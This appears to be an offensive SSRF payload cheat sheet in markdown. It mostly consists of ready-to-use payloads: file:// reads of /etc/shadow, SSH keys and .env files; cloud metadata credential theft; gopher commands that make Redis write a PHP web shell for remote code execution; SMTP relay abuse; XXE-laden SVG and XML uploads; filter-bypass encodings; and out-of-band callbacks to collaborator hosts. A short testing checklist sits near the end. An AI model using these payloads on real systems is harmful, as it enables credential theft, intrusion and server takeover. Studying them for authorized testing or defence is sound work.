### üõ°Ô∏è Server-Side Request Forgery (SSRF)

**Server-Side Request Forgery (SSRF)** is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing. This can lead to unauthorized actions, access to internal systems, or data exfiltration.

  * **Injection Point:** Occurs when user-supplied URLs are used to make server-side requests without proper validation.
  * **Impact:** Can lead to internal network enumeration, service abuse, and data exfiltration.
  * **Common Targets:** Web applications that fetch remote resources based on user input.
  * **Root Cause:** Lack of proper URL validation and whitelisting of allowed domains.

-----

### üìò Basic SSRF Payloads and Impact

Understanding the fundamental SSRF attack vectors and their potential impact.

  * **Reading Local Files via file:// Protocol**

    ```http
    https://vulnerable-site.com/fetch?url=file:///etc/passwd
    https://vulnerable-site.com/fetch?url=file:///c:/windows/win.ini
    ```

    **Why it's used:** To read sensitive system files directly from the server's filesystem.
    **How it works:** The `file://` protocol handler allows direct access to local filesystem resources.

  * **Internal Network Scanning**

    ```http
    http://192.168.1.1/
    http://10.0.0.1:22/
    http://127.0.0.1:3306/
    http://internal-api.local:8080/admin
    ```

    **Why it's used:** To discover and interact with internal services that are not exposed to the public internet.
    **How it works:** The vulnerable server acts as a proxy, making requests to internal network ranges.

  * **Cloud Metadata Endpoints**

    ```http
    # AWS Metadata
    http://169.254.169.254/latest/meta-data/
    http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
    
    # Azure Metadata
    http://169.254.169.254/metadata/instance?api-version=2021-02-01
    
    # Google Cloud Metadata
    http://metadata.google.internal/computeMetadata/v1/
    http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
    ```

    **Why it's used:** To extract cloud credentials, instance metadata, and configuration secrets.
    **How it works:** Cloud providers use specific internal endpoints for instance metadata retrieval.

-----

### üñºÔ∏è File Protocol (file://) Exploitation

Deep dive into file protocol exploitation for local file access.

  * **Linux/Unix File Access**

    ```http
    file:///etc/passwd
    file:///etc/shadow
    file:///etc/hosts
    file:///proc/self/environ
    file:///proc/self/cmdline
    file:///var/www/html/config.php
    file:///home/user/.ssh/id_rsa
    file:///var/log/auth.log
    ```

    **Why it's used:** To read system configuration, application secrets, and user data on Linux systems.
    **How it works:** Direct filesystem access through the file protocol handler.

  * **Windows File Access**

    ```http
    file:///c:/windows/win.ini
    file:///c:/windows/system32/drivers/etc/hosts
    file:///c:/boot.ini
    file:///c:/windows/system.ini
    file:///c:/users/administrator/desktop/secrets.txt
    file:///c:/program files/apache/conf/httpd.conf
    ```

    **Why it's used:** To access Windows system files and application configurations.
    **How it works:** Windows path structure with drive letters accessed via file protocol.

  * **Web Application Configurations**

    ```http
    file:///var/www/html/.env
    file:///var/www/html/config/database.php
    file:///var/www/html/web.config
    file:///var/www/html/wp-config.php
    file:///var/www/html/app/config/parameters.yml
    ```

    **Why it's used:** To extract database credentials, API keys, and application secrets.
    **How it works:** Targeting common web application configuration file locations.

-----

### üîÑ Advanced Protocol Handlers

Leveraging alternative protocols for advanced SSRF exploitation.

  * **Dict Protocol for Service Interaction**

    ```http
    dict://127.0.0.1:6379/info
    dict://127.0.0.1:11211/stats
    dict://127.0.0.1:9200/info
    ```

    **Why it's used:** To query internal services like Redis, Memcached, or Elasticsearch.
    **How it works:** The dict protocol allows interaction with various TCP-based services.

  * **Gopher Protocol for Raw TCP**

    ```http
    gopher://127.0.0.1:6379/_INFO
    gopher://127.0.0.1:25/_HELO%20localhost
    gopher://127.0.0.1:27017/_isMaster%0A
    ```

    **Why it's used:** For advanced exploitation of services using raw TCP packets.
    **How it works:** Gopher allows sending custom TCP payloads to internal services.

  * **FTP Protocol for File Access**

    ```http
    ftp://anonymous:anonymous@internal-ftp/file.txt
    ftp://user:pass@192.168.1.100/conf/config.xml
    ```

    **Why it's used:** To access files on internal FTP servers or test credentials.
    **How it works:** FTP protocol handler for file transfer operations.

-----

### ü§´ Blind SSRF and Out-of-Band Techniques

Techniques for detecting and exploiting SSRF when responses aren't visible.

  * **Out-of-Band Detection**

    ```http
    http://unique-id.burpcollaborator.net
    http://unique-id.interact.sh
    http://unique-id.requestcatcher.com
    ```

    **Why it's used:** To confirm SSRF vulnerability when responses aren't reflected.
    **How it works:** The server makes requests to external domains controlled by the attacker.

  * **Time-Based Detection**

    ```http
    http://192.168.1.1:22/  # SSH - typically slow response
    http://127.0.0.1:5432/  # PostgreSQL - specific response time
    ```

    **Why it's used:** To detect open ports based on response timing differences.
    **How it works:** Different services have characteristic response times.

  * **Error-Based Detection**

    ```http
    http://invalid-protocol://internal-service/
    http://malformed-url.internal/
    ```

    **Why it's used:** To infer internal service existence through error messages.
    **How it works:** Analyzing error responses for information about internal systems.

-----

### üåÄ Advanced Service Exploitation

Exploiting specific services through SSRF attacks.

  * **Redis Exploitation for RCE**

    ```http
    gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html
    gopher://127.0.0.1:6379/_CONFIG%20SET%20dbfilename%20shell.php
    gopher://127.0.0.1:6379/_SET%20shell%20"<?php%20system($_GET['cmd']);%20?>"
    gopher://127.0.0.1:6379/_SAVE
    ```

    **Why it's used:** To achieve remote code execution through Redis unauthorized access.
    **How it works:** Configuring Redis to write web shells to accessible directories.

  * **Memcached Exploitation**

    ```http
    gopher://127.0.0.1:11211/_set%20key%200%200%205%0Avalue
    gopher://127.0.0.1:11211/_get%20key
    gopher://127.0.0.1:11211/_flush_all
    ```

    **Why it's used:** To manipulate cached data or cause service disruption.
    **How it works:** Direct interaction with Memcached service.

  * **SMTP Abuse**

    ```http
    gopher://127.0.0.1:25/_
    HELO localhost%0A
    MAIL FROM:<attacker@example.com>%0A
    RCPT TO:<victim@example.com>%0A
    DATA%0A
    Subject: Phishing%20Test%0A%0A
    This%20is%20a%20test%20email%0A
    .%0A
    QUIT%0A
    ```

    **Why it's used:** To send unauthorized emails or test for open SMTP relays.
    **How it works:** Crafting SMTP commands through SSRF.

-----

### üõ°Ô∏è SSRF via File Upload

Exploiting SSRF through file upload functionalities.

  * **Malicious SVG with SSRF**

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE svg [
        <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
    ]>
    <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
        <text>&xxe;</text>
    </svg>
    ```

    **Why it's used:** When applications process uploaded SVG files with XML parsers.
    **How it works:** Embedded XXE in SVG files triggers SSRF when processed.

  * **Malicious XML File**

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE data [
        <!ENTITY % remote SYSTEM "http://169.254.169.254/latest/meta-data/">
        %remote;
    ]>
    <data>test</data>
    ```

    **Why it's used:** For applications that process XML uploads.
    **How it works:** XXE payloads in uploaded XML files trigger external requests.

  * **PDF with SSRF**

    ```html
    <!DOCTYPE html>
    <html>
    <body>
        <iframe src="http://169.254.169.254/latest/meta-data/"></iframe>
        <img src="http://internal-service:8080/secret" onerror="alert('SSRF')">
    </body>
    </html>
    ```

    **Why it's used:** When applications convert HTML to PDF or render uploaded content.
    **How it works:** Embedded resources in uploaded files trigger server-side requests.

-----

### üîÄ Obfuscation and Bypass Techniques

Advanced techniques to bypass SSRF protections.

  * **IP Address Obfuscation**

    ```http
    http://127.1/
    http://0x7f000001/
    http://0177.0000.0000.0001/
    http://2130706433/
    http://[::1]/
    http://[::ffff:127.0.0.1]/
    ```

    **Why it's used:** To bypass IP-based blacklists and filters.
    **How it works:** Using alternative IP representations that resolve to the same address.

  * **Domain Bypass Techniques**

    ```http
    http://127.0.0.1.nip.io/
    http://localhost.localdomain/
    http://‚ìõ‚ìû‚ìí‚ìê‚ìõ‚ìó‚ìû‚ì¢‚ì£.com/
    http://l0calh0st/
    http://127.0.0.1.xx.nip.io/
    ```

    **Why it's used:** To bypass domain-based filters and blacklists.
    **How it works:** Using domain tricks that resolve to localhost or internal IPs.

  * **Protocol and Case Variations**

    ```http
    https://127.0.0.1/
    HTTP://127.0.0.1/
    //127.0.0.1/
    \/\/127.0.0.1/
    http:/127.0.0.1/
    http:127.0.0.1/
    ```

    **Why it's used:** To bypass protocol-based validation.
    **How it works:** Exploiting parser differences in URL validation.

  * **URL Encoding and Double Encoding**

    ```http
    file:%2f%2f%2fetc%2fpasswd
    http:%252f%252f127.0.0.1%252f
    %66%69%6c%65%3a%2f%2f%2f%65%74%63%2f%70%61%73%73%77%64
    ```

    **Why it's used:** To bypass string-based filters and WAF rules.
    **How it works:** Encoding techniques that decode to valid URLs after validation.

  * **Open Redirect Chains**

    ```http
    http://allowed-domain.com/redirect?url=http://169.254.169.254/
    http://trusted-site.com/out?target=http://internal-service/
    https://google.com/url?q=http://192.168.1.1/
    ```

    **Why it's used:** To bypass domain whitelists using trusted domains with open redirects.
    **How it works:** Chaining SSRF with open redirect vulnerabilities.

-----

### üïµÔ∏è‚Äç‚ôÄÔ∏è Detection and Testing Methods

Comprehensive approaches for SSRF vulnerability detection.

  * **Manual Testing Approach**

    1. Identify URL parameters that trigger server-side requests
    2. Test with internal IP addresses and localhost
    3. Attempt file protocol access
    4. Test cloud metadata endpoints
    5. Use out-of-band detection services
    6. Verify protocol handlers (dict, gopher, ftp)

  * **Basic Detection Payloads**

    ```http
    http://169.254.169.254/latest/meta-data/
    http://127.0.0.1:22/
    file:///etc/passwd
    dict://127.0.0.1:6379/info
    http://burpcollaborator.net
    ```

  * **Burp Suite Collaborator Integration**

    ```http
    GET /fetch?url=http://UNIQUE.burpcollaborator.net/ HTTP/1.1
    Host: vulnerable-app.com
    
    POST /webhook HTTP/1.1
    Host: vulnerable-app.com
    Content-Type: application/json
    
    {"url":"http://UNIQUE.burpcollaborator.net/"}
    ```

    **Why it's used:** For automated blind SSRF detection.
    **How it works:** Burp Collaborator provides unique domains that capture incoming requests.

-----

### üîç Real-World Exploitation Scenarios

Practical examples of SSRF exploitation in different contexts.

  * **Webhook Configuration Abuse**

    ```http
    POST /api/webhooks HTTP/1.1
    Host: vulnerable-app.com
    Content-Type: application/json
    
    {
      "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
      "event": "user.created"
    }
    ```

  * **PDF Generation Service**

    ```http
    POST /generate-pdf HTTP/1.1
    Host: vulnerable-app.com
    Content-Type: application/json
    
    {
      "html": "<img src='http://169.254.169.254/latest/meta-data/'>",
      "options": {"format": "A4"}
    }
    ```

  * **URL Preview Feature**

    ```http
    POST /api/preview HTTP/1.1
    Host: vulnerable-app.com
    Content-Type: application/json
    
    {
      "url": "file:///etc/passwd"
    }
    ```

  * **SSRF Chaining with Open Redirect**

    ```http
    GET /fetch?url=https://trusted-site.com/redirect?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
    Host: vulnerable-app.com
    ```

-----

**Made with love by VIsh0k**